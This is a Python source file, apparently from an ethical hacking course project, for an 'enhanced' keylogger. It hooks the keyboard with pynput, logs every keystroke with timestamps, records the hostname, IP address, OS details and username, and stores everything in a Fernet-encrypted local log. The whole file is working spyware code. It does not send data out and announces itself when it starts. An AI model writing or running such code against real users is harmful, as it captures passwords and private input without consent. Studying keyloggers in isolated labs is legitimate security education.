"""
Enhanced Keylogger with System Info, Encryption, and Advanced Features
SENG 484 - Ethical Hacking Project
For Educational Purposes Only - Use in Isolated Environment
"""

import os
import platform
import socket
from datetime import datetime
from pynput import keyboard
from cryptography.fernet import Fernet
import getpass

class EnhancedKeylogger:
    def __init__(self, log_file="encrypted_log.txt", key_file="secret.key"):
        self.log_file = log_file
        self.key_file = key_file
        self.key = self.load_or_create_key()
        self.cipher = Fernet(self.key)
        
        # Log system info at startup
        self.log_system_info()
        
    def load_or_create_key(self):
        """Load existing encryption key or create new one"""
        if os.path.exists(self.key_file):
            with open(self.key_file, 'rb') as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(self.key_file, 'wb') as f:
                f.write(key)
            return key
    
    def get_system_info(self):
        """Collect comprehensive system information"""
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
        except:
            hostname = "Unknown"
            ip = "Unknown"
        
        info = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "hostname": hostname,
            "ip_address": ip,
            "os": platform.system(),
            "os_version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "username": getpass.getuser()
        }
        return info
    
    def log_system_info(self):
        """Log system information at the start of session"""
        info = self.get_system_info()
        header = "\n" + "="*50 + "\n"
        header += "NEW SESSION STARTED\n"
        header += "="*50 + "\n"
        for key, value in info.items():
            header += f"{key.upper()}: {value}\n"
        header += "="*50 + "\n\n"
        
        self.write_encrypted(header)
    
    def write_encrypted(self, data):
        """Encrypt and write data to log file"""
        encrypted_data = self.cipher.encrypt(data.encode())
        with open(self.log_file, 'ab') as f:
            f.write(encrypted_data + b'\n')
    
    def on_press(self, key):
        """Handle key press events"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        try:
            log_entry = f"[{timestamp}] {key.char}"
        except AttributeError:
            # Special keys
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "[ENTER]\n",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.ctrl: "[CTRL]",
                keyboard.Key.alt: "[ALT]",
                keyboard.Key.caps_lock: "[CAPSLOCK]",
                keyboard.Key.esc: "[ESC]"
            }
            log_entry = f"[{timestamp}] {special_keys.get(key, f'[{key}]')}"
        
        self.write_encrypted(log_entry)
    
    def start(self):
        """Start the keylogger"""
        print("Enhanced Keylogger Started...")
        print(f"Encrypted log file: {self.log_file}")
        print(f"Encryption key file: {self.key_file}")
        print("Press Ctrl+C to stop")
        
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

def main():
    keylogger = EnhancedKeylogger()
    keylogger.start()

if __name__ == "__main__":
    main()